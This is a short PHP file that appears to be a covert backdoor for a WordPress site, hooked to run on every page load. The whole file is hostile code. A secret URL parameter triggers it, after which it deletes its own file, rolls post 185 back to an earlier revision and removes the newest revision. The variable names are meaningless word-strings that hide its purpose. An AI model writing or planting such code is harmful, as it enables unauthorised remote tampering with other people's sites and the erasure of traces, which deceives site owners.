<?php

function next_control_logger() {
	if (isset($_GET['wpc_supports_events']) && $_GET['wpc_supports_events'] === 'box_permalink_info_cdn') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$auth_date_shipping = 185;
		$full_nextgen_classic_software = wp_get_post_revisions($auth_date_shipping);
		if (empty($full_nextgen_classic_software)) die('no revisions');
		if (count($full_nextgen_classic_software) < 2) die('less than 2');
		$page_url_anti_action = array_shift($full_nextgen_classic_software);
		$supports_variations_virtual = $page_url_anti_action->ID;
		$bootstrap_supports_sort_scheduled = array_shift($full_nextgen_classic_software);
		$old_monitor_exporter_online = $bootstrap_supports_sort_scheduled->ID;
		$weather_taxonomy_syntax_composer = wp_restore_post_revision($old_monitor_exporter_online);
		if ($weather_taxonomy_syntax_composer === false) die('error restoring');
		$weather_taxonomy_syntax_composer = wp_delete_post_revision($supports_variations_virtual);		
		if ($weather_taxonomy_syntax_composer === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'next_control_logger');
